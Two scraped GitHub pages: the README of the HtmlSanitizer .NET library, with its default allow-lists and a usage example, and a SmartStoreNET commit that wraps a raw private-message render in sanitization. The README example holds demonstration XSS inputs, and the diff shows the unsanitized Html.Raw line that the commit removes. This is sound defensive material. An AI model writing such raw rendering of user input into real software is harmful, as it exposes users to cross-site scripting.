[![netstandard2.0](https://camo.githubusercontent.com/ca70e7b67a9974142789e7b75f4a911e07d8bff6b4c72a3331a0347ea743656c/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e65747374616e646172642d322e302d627269676874677265656e2e737667)](https://img.shields.io/badge/netstandard-2.0-brightgreen.svg)
[![net46](https://camo.githubusercontent.com/d9de8fff43247b028442591d5af3ebbe5458d6a90877098031d97b863f8c7c6b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e65742d3436312d627269676874677265656e2e737667)](https://img.shields.io/badge/net-461-brightgreen.svg)

HtmlSanitizer is a .NET library for cleaning HTML fragments and documents from constructs that can lead to [XSS attacks](https://en.wikipedia.org/wiki/Cross-site_scripting).
It uses [AngleSharp](https://github.com/AngleSharp/AngleSharp) to parse, manipulate, and render HTML and CSS.

Because HtmlSanitizer is based on a robust HTML parser it can also shield you from deliberate or accidental
"tag poisoning" where invalid HTML in one fragment can corrupt the whole document leading to broken layout or style.

In order to facilitate different use cases, HtmlSanitizer can be customized at several levels:

* Configure allowed HTML tags through the property `AllowedTags`. All other tags will be stripped.
* Configure allowed HTML attributes through the property `AllowedAttributes`. All other attributes will be stripped.
* Configure allowed CSS property names through the property `AllowedCssProperties`. All other styles will be stripped.
* Configure allowed CSS [at-rules](https://developer.mozilla.org/en-US/docs/Web/CSS/At-rule) through the property `AllowedAtRules`. All other at-rules will be stripped.
* Configure allowed URI schemes through the property `AllowedSchemes`. All other URIs will be stripped.
* Configure HTML attributes that contain URIs (such as "src", "href" etc.) through the property `UriAttributes`.
* Provide a base URI that will be used to resolve relative URIs against.
* Cancelable events are raised before a tag, attribute, or style is removed.

## Usage

Install the [HtmlSanitizer NuGet package](https://www.nuget.org/packages/HtmlSanitizer/). Then:

```
using Ganss.Xss;
var sanitizer = new HtmlSanitizer();
var html = @"<script>alert('xss')</script><div onload=""alert('xss')"""
    + @"style=""background-color: rgba(0, 0, 0, 1)"">Test<img src=""test.png"""
    + @"style=""background-image: url(javascript:alert('xss')); margin: 10px""></div>";
var sanitized = sanitizer.Sanitize(html, "https://www.example.com");
var expected = @"<div style=""background-color: rgba(0, 0, 0, 1)"">"
    + @"Test<img src=""https://www.example.com/test.png"" style=""margin: 10px""></div>";
Assert.Equal(expected, sanitized);
```

There's an [online demo](https://xss.ganss.org/), plus there's also a [.NET Fiddle](https://dotnetfiddle.net/892nOk) you can play with.

More example code and a description of possible options can be found in the [Wiki](https://github.com/mganss/HtmlSanitizer/wiki).

### Tags allowed by default

`a`,
`abbr`,
`acronym`,
`address`,
`area`,
`article`,
`aside`,
`b`,
`bdi`,
`big`,
`blockquote`,
`body`,
`br`,
`button`,
`caption`,
`center`,
`cite`,
`code`,
`col`,
`colgroup`,
`data`,
`datalist`,
`dd`,
`del`,
`details`,
`dfn`,
`dir`,
`div`,
`dl`,
`dt`,
`em`,
`fieldset`,
`figcaption`,
`figure`,
`font`,
`footer`,
`form`,
`h1`,
`h2`,
`h3`,
`h4`,
`h5`,
`h6`,
`head`,
`header`,
`hr`,
`html`,
`i`,
`img`,
`input`,
`ins`,
`kbd`,
`keygen`,
`label`,
`legend`,
`li`,
`main`,
`map`,
`mark`,
`menu`,
`menuitem`,
`meter`,
`nav`,
`ol`,
`optgroup`,
`option`,
`output`,
`p`,
`pre`,
`progress`,
`q`,
`rp`,
`rt`,
`ruby`,
`s`,
`samp`,
`section`,
`select`,
`small`,
`span`,
`strike`,
`strong`,
`sub`,
`summary`,
`sup`,
`table`,
`tbody`,
`td`,
`textarea`,
`tfoot`,
`th`,
`thead`,
`time`,
`tr`,
`tt`,
`u`,
`ul`,
`var`,
`wbr`

### Attributes allowed by default

`abbr`,
`accept-charset`,
`accept`,
`accesskey`,
`action`,
`align`,
`alt`,
`autocomplete`,
`autosave`,
`axis`,
`bgcolor`,
`border`,
`cellpadding`,
`cellspacing`,
`challenge`,
`char`,
`charoff`,
`charset`,
`checked`,
`cite`,
`clear`,
`color`,
`cols`,
`colspan`,
`compact`,
`contenteditable`,
`coords`,
`datetime`,
`dir`,
`disabled`,
`draggable`,
`dropzone`,
`enctype`,
`for`,
`frame`,
`headers`,
`height`,
`high`,
`href`,
`hreflang`,
`hspace`,
`ismap`,
`keytype`,
`label`,
`lang`,
`list`,
`longdesc`,
`low`,
`max`,
`maxlength`,
`media`,
`method`,
`min`,
`multiple`,
`name`,
`nohref`,
`noshade`,
`novalidate`,
`nowrap`,
`open`,
`optimum`,
`pattern`,
`placeholder`,
`prompt`,
`pubdate`,
`radiogroup`,
`readonly`,
`rel`,
`required`,
`rev`,
`reversed`,
`rows`,
`rowspan`,
`rules`,
`scope`,
`selected`,
`shape`,
`size`,
`span`,
`spellcheck`,
`src`,
`start`,
`step`,
`style`,
`summary`,
`tabindex`,
`target`,
`title`,
`type`,
`usemap`,
`valign`,
`value`,
`vspace`,
`width`,
`wrap`

*Note:* to prevent [classjacking](https://html5sec.org/#123) and interference with classes where the sanitized fragment is to be integrated, the `class` attribute is disallowed by default.
It can be added as follows:

```
var sanitizer = new HtmlSanitizer();
sanitizer.AllowedAttributes.Add("class");
var sanitized = sanitizer.Sanitize(html);
```

### CSS properties allowed by default

`align-content`,
`align-items`,
`align-self`,
`all`,
`animation`,
`animation-delay`,
`animation-direction`,
`animation-duration`,
`animation-fill-mode`,
`animation-iteration-count`,
`animation-name`,
`animation-play-state`,
`animation-timing-function`,
`backface-visibility`,
`background`,
`background-attachment`,
`background-blend-mode`,
`background-clip`,
`background-color`,
`background-image`,
`background-origin`,
`background-position`,
`background-position-x`,
`background-position-y`,
`background-repeat`,
`background-repeat-x`,
`background-repeat-y`,
`background-size`,
`border`,
`border-bottom`,
`border-bottom-color`,
`border-bottom-left-radius`,
`border-bottom-right-radius`,
`border-bottom-style`,
`border-bottom-width`,
`border-collapse`,
`border-color`,
`border-image`,
`border-image-outset`,
`border-image-repeat`,
`border-image-slice`,
`border-image-source`,
`border-image-width`,
`border-left`,
`border-left-color`,
`border-left-style`,
`border-left-width`,
`border-radius`,
`border-right`,
`border-right-color`,
`border-right-style`,
`border-right-width`,
`border-spacing`,
`border-style`,
`border-top`,
`border-top-color`,
`border-top-left-radius`,
`border-top-right-radius`,
`border-top-style`,
`border-top-width`,
`border-width`,
`bottom`,
`box-decoration-break`,
`box-shadow`,
`box-sizing`,
`break-after`,
`break-before`,
`break-inside`,
`caption-side`,
`caret-color`,
`clear`,
`clip`,
`color`,
`column-count`,
`column-fill`,
`column-gap`,
`column-rule`,
`column-rule-color`,
`column-rule-style`,
`column-rule-width`,
`column-span`,
`column-width`,
`columns`,
`content`,
`counter-increment`,
`counter-reset`,
`cursor`,
`direction`,
`display`,
`empty-cells`,
`filter`,
`flex`,
`flex-basis`,
`flex-direction`,
`flex-flow`,
`flex-grow`,
`flex-shrink`,
`flex-wrap`,
`float`,
`font`,
`font-family`,
`font-feature-settings`,
`font-kerning`,
`font-language-override`,
`font-size`,
`font-size-adjust`,
`font-stretch`,
`font-style`,
`font-synthesis`,
`font-variant`,
`font-variant-alternates`,
`font-variant-caps`,
`font-variant-east-asian`,
`font-variant-ligatures`,
`font-variant-numeric`,
`font-variant-position`,
`font-weight`,
`gap`,
`grid`,
`grid-area`,
`grid-auto-columns`,
`grid-auto-flow`,
`grid-auto-rows`,
`grid-column`,
`grid-column-end`,
`grid-column-gap`,
`grid-column-start`,
`grid-gap`,
`grid-row`,
`grid-row-end`,
`grid-row-gap`,
`grid-row-start`,
`grid-template`,
`grid-template-areas`,
`grid-template-columns`,
`grid-template-rows`,
`hanging-punctuation`,
`height`,
`hyphens`,
`image-rendering`,
`isolation`,
`justify-content`,
`left`,
`letter-spacing`,
`line-break`,
`line-height`,
`list-style`,
`list-style-image`,
`list-style-position`,
`list-style-type`,
`margin`,
`margin-bottom`,
`margin-left`,
`margin-right`,
`margin-top`,
`mask`,
`mask-clip`,
`mask-composite`,
`mask-image`,
`mask-mode`,
`mask-origin`,
`mask-position`,
`mask-repeat`,
`mask-size`,
`mask-type`,
`max-height`,
`max-width`,
`min-height`,
`min-width`,
`mix-blend-mode`,
`object-fit`,
`object-position`,
`opacity`,
`order`,
`orphans`,
`outline`,
`outline-color`,
`outline-offset`,
`outline-style`,
`outline-width`,
`overflow`,
`overflow-wrap`,
`overflow-x`,
`overflow-y`,
`padding`,
`padding-bottom`,
`padding-left`,
`padding-right`,
`padding-top`,
`page-break-after`,
`page-break-before`,
`page-break-inside`,
`perspective`,
`perspective-origin`,
`pointer-events`,
`position`,
`quotes`,
`resize`,
`right`,
`row-gap`,
`scroll-behavior`,
`tab-size`,
`table-layout`,
`text-align`,
`text-align-last`,
`text-combine-upright`,
`text-decoration`,
`text-decoration-color`,
`text-decoration-line`,
`text-decoration-skip`,
`text-decoration-style`,
`text-indent`,
`text-justify`,
`text-orientation`,
`text-overflow`,
`text-shadow`,
`text-transform`,
`text-underline-position`,
`top`,
`transform`,
`transform-origin`,
`transform-style`,
`transition`,
`transition-delay`,
`transition-duration`,
`transition-property`,
`transition-timing-function`,
`unicode-bidi`,
`user-select`,
`vertical-align`,
`visibility`,
`white-space`,
`widows`,
`width`,
`word-break`,
`word-spacing`,
`word-wrap`,
`writing-mode`,
`z-index`

### CSS at-rules allowed by default

`namespace`, `style`

`style` refers to style declarations within other at-rules such as `@media`. Disallowing `@namespace` while allowing other types of at-rules can lead to errors.
Property declarations in `@font-face` and `@viewport` are not sanitized.

*Note:* the `style` tag is disallowed by default.

### URI schemes allowed by default

`http`, `https`

*Note:* [Protocol-relative URLs](https://en.wikipedia.org/wiki/Wikipedia%3AProtocol-relative_URL) (e.g. <//github.com>) are allowed by default (as are other relative URLs).

to allow `mailto:` links:

```
sanitizer.AllowedSchemes.Add("mailto");
```

### Default attributes that contain URIs

`action`, `background`, `dynsrc`, `href`, `lowsrc`, `src`

### Thread safety

The `Sanitize()` and `SanitizeDocument()` methods are thread-safe, i.e. you can use these methods on a single shared instance from different threads provided you do not simultaneously set instance or static properties. A typical use case is that you prepare an `HtmlSanitizer` instance once (i.e. set desired properties such as `AllowedTags` etc.) from a single thread, then call `Sanitize()`/`SanitizeDocument()` from multiple threads.

### Text content not necessarily preserved as-is

Please note that as the input is parsed by AngleSharp's HTML parser and then rendered back out, you cannot expect the text content to be preserved exactly as it was input, even if no elements or attributes were removed. Examples:

* `4 < 5` becomes `4 &lt; 5`
* `<SPAN>test</p>` becomes `<span>test<p></p></span>`
* `<span title='test'>test</span>` becomes `<span title="test">test</span>`

On the other hand, although some broken HTML is fixed by the parser, the output might still contain invalid HTML. Examples:

* `<div><li>test</li></div>`
* `<ul><br><li>test</li></ul>`
* `<h3><p>test</p></h3>`

## License

[MIT License](https://en.wikipedia.org/wiki/MIT_License)

## About

Cleans HTML to avoid XSS attacks

### Topics

[html](/topics/html "Topic: html")
[xss](/topics/xss "Topic: xss")
[sanitizer](/topics/sanitizer "Topic: sanitizer")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/mganss/HtmlSanitizer/activity)
### Stars

[**1.6k**
stars](/mganss/HtmlSanitizer/stargazers)
### Watchers

[**55**
watching](/mganss/HtmlSanitizer/watchers)
### Forks

[**205**
forks](/mganss/HtmlSanitizer/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmganss%2FHtmlSanitizer&report=mganss+%28user%29)

## [Releases 85](/mganss/HtmlSanitizer/releases)

[8.1.870
Latest

Jul 26, 2024](/mganss/HtmlSanitizer/releases/tag/v8.1.870)
[+ 84 releases](/mganss/HtmlSanitizer/releases)

## [Packages 0](/users/mganss/packages?repo_name=HtmlSanitizer)

No packages published

## [Used by 3.7k](/mganss/HtmlSanitizer/network/dependents)

[* ![@cmlthienkhai](https://avatars.githubusercontent.com/u/144123190?s=64&v=4)
* ![@GtJohnny](https://avatars.githubusercontent.com/u/148626933?s=64&v=4)
* ![@lumixmc401](https://avatars.githubusercontent.com/u/38401508?s=64&v=4)
* ![@sanya031](https://avatars.githubusercontent.com/u/69260951?s=64&v=4)
* ![@efalcon123](https://avatars.githubusercontent.com/u/26912268?s=64&v=4)
* ![@naman-cr](https://avatars.githubusercontent.com/u/76682299?s=64&v=4)
* ![@MarooKros](https://avatars.githubusercontent.com/u/175708211?s=64&v=4)
* ![@Androidus2](https://avatars.githubusercontent.com/u/36742066?s=64&v=4)

+ 3,643](/mganss/HtmlSanitizer/network/dependents)

## [Contributors 21](/mganss/HtmlSanitizer/graphs/contributors)

* [![@mganss](https://avatars.githubusercontent.com/u/976344?s=64&v=4)](https://github.com/mganss)
* [![@dependabot[bot]](https://avatars.githubusercontent.com/in/29110?s=64&v=4)](https://github.com/apps/dependabot)
* [![@dependabot-preview[bot]](https://avatars.githubusercontent.com/in/2141?s=64&v=4)](https://github.com/apps/dependabot-preview)
* [![@vanillajonathan](https://avatars.githubusercontent.com/u/10222521?s=64&v=4)](https://github.com/vanillajonathan)
* [![@304NotModified](https://avatars.githubusercontent.com/u/5808377?s=64&v=4)](https://github.com/304NotModified)
* [![@The-Nutty](https://avatars.githubusercontent.com/u/6254011?s=64&v=4)](https://github.com/The-Nutty)
* [![@leniency](https://avatars.githubusercontent.com/u/173730?s=64&v=4)](https://github.com/leniency)
* [![@emptyGit](https://avatars.githubusercontent.com/u/16704237?s=64&v=4)](https://github.com/emptyGit)
* [![@bjornri](https://avatars.githubusercontent.com/u/53167680?s=64&v=4)](https://github.com/bjornri)
* [![@lahma](https://avatars.githubusercontent.com/u/171892?s=64&v=4)](https://github.com/lahma)
* [![@markashleybell](https://avatars.githubusercontent.com/u/483470?s=64&v=4)](https://github.com/markashleybell)
* [![@Jawvig](https://avatars.githubusercontent.com/u/488393?s=64&v=4)](https://github.com/Jawvig)
* [![@reinaldocoelho](https://avatars.githubusercontent.com/u/889634?s=64&v=4)](https://github.com/reinaldocoelho)
* [![@jerriep](https://avatars.githubusercontent.com/u/1006420?s=64&v=4)](https://github.com/jerriep)

[+ 7 contributors](/mganss/HtmlSanitizer/graphs/contributors)

## Languages

* [C#
  100.0%](/mganss/HtmlSanitizer/search?l=c%23)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f11e34e8_20250115_190923.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsmartstore%2FSmartStoreNET%2Fcommit%2F5b4e60ae7124df0898975cb8f994f9f23db1fae3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsmartstore%2FSmartStoreNET%2Fcommit%2F5b4e60ae7124df0898975cb8f994f9f23db1fae3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=smartstore%2FSmartStoreNET)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[smartstore](/smartstore)
/
**[SmartStoreNET](/smartstore/SmartStoreNET)**
Public

* [Notifications](/login?return_to=%2Fsmartstore%2FSmartStoreNET) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fsmartstore%2FSmartStoreNET)
* [Star
   2.6k](/login?return_to=%2Fsmartstore%2FSmartStoreNET)

* [Code](/smartstore/SmartStoreNET)
* [Issues
  25](/smartstore/SmartStoreNET/issues)
* [Pull requests
  23](/smartstore/SmartStoreNET/pulls)
* [Actions](/smartstore/SmartStoreNET/actions)
* [Projects
  0](/smartstore/SmartStoreNET/projects)
* [Security](/smartstore/SmartStoreNET/security)
* [Insights](/smartstore/SmartStoreNET/pulse)

Additional navigation options

* [Code](/smartstore/SmartStoreNET)
* [Issues](/smartstore/SmartStoreNET/issues)
* [Pull requests](/smartstore/SmartStoreNET/pulls)
* [Actions](/smartstore/SmartStoreNET/actions)
* [Projects](/smartstore/SmartStoreNET/projects)
* [Security](/smartstore/SmartStoreNET/security)
* [Insights](/smartstore/SmartStoreNET/pulse)

## Commit

[Permalink](/smartstore/SmartStoreNET/commit/5b4e60ae7124df0898975cb8f994f9f23db1fae3)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fixed text issue in private messages of forum

[Browse files](/smartstore/SmartStoreNET/tree/5b4e60ae7124df0898975cb8f994f9f23db1fae3)
Browse the repository at this point in the history

* Loading branch information

[![@mgesing](https://avatars.githubusercontent.com/u/8446701?s=40&v=4)](/mgesing)

[mgesing](/smartstore/SmartStoreNET/commits?author=mgesing "View all commits by mgesing")
committed
May 10, 2021

1 parent
[fe4a039](/smartstore/SmartStoreNET/commit/fe4a039964d1fdfd6d0de8098c835b2a0897436e)

commit 5b4e60a

Showing
**1 changed file**
with
**2 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

3 changes: 2 additions & 1 deletion

3
[src/Presentation/SmartStore.Web/Views/PrivateMessages/View.cshtml](#diff-9c9b04fe3e7807c6b3f0e95cd18e4eab052cd3cbe5da2fe615647ac42707bcb5 "src/Presentation/SmartStore.Web/Views/PrivateMessages/View.cshtml")

Show comments

[View file](/smartstore/SmartStoreNET/blob/5b4e60ae7124df0898975cb8f994f9f23db1fae3/src/Presentation/SmartStore.Web/Views/PrivateMessages/View.cshtml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,5 +1,6 @@ |
|  |  | @model PrivateMessageModel |
|  |  | @using SmartStore.Web.Models.PrivateMessages; |
|  |  | @using SmartStore.Core.Html; |
|  |  | @{ |
|  |  | Layout = "\_Layout"; |
|  |  | Html.AddTitleParts(T("PageTitle.ViewPM").Text); |
| Expand Down  Expand Up | | @@ -28,7 +29,7 @@ |
|  |  | <div class="col-sm-9"> |
|  |  | <div class="card"> |
|  |  | <div class="card-body" dir="auto"> |
|  |  | @Html.Raw(Model.Message) |
|  |  | @Html.Raw(HtmlUtils.SanitizeHtml(Model.Message, true)) |
|  |  | </div> |
|  |  | </div> |
|  |  | </div> |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `5b4e60a`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsmartstore%2FSmartStoreNET%2Fcommit%2F5b4e60ae7124df0898975cb8f994f9f23db1fae3) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


